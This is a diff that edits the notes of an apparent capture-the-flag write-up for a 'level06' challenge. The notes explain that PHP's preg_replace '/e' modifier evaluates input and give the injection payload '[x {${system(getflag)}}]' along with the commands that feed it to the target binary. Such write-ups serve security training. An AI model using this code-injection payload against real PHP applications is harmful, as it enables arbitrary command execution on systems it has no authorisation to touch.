@@ -1,10 +1,5 @@
-# there is a bin and a php script in the home
-# once we understood the php script, it got clearer
-# the second arg is useless.
-# the first arg must be like [x EXPLOIT ]
-# then transformed in y("EXPLOIT")
-# so we tried {${system(getflag)}}
-# and the flag appeared.
-# 
-# echo "[x {${system(getflag)}}]" > /tmp/file
+# There is a bin and a php script in the home
+# '/e' in the preg_replace will eval the string
+# The second arg is useless.
+# echo "[x {\${system(getflag)}}]" > /tmp/file
 # ~/level06 /tmp/file dummy_arg
